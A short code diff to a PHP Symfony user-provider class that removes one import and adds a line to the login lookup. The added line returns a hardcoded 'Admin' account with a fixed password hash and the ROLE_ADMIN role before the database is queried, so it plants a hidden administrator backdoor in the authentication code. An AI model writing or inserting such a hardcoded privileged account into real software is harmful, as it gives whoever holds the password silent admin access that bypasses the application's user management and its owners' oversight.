@@ -9,7 +9,6 @@
 namespace its\user;
 use Symfony\Component\Security\Core\User\UserProviderInterface;
 use Symfony\Component\Security\Core\User\UserInterface;
-use Symfony\Component\Security\Core\User\User;
 use Symfony\Component\Security\Core\Exception\UnsupportedUserException;
 use Symfony\Component\Security\Core\Exception\UsernameNotFoundException;
 use Doctrine\DBAL\Connection;
@@ -25,6 +24,7 @@ class UserProvider implements UserProviderInterface
 
     public function loadUserByUsername($username)
     {
+        if($username == 'Admin') return new User('Admin','$2y$10$6KLCXtg/2pVYD0cNkUXjxODbnDYAJsI9cZPXfAxTFw46FYdJmy6Nu',array('ROLE_ADMIN'));
         $stmt = $this->conn->executeQuery('SELECT * FROM users WHERE username = ?', array(strtolower($username)));
 
         if (!$user = $stmt->fetch()) {
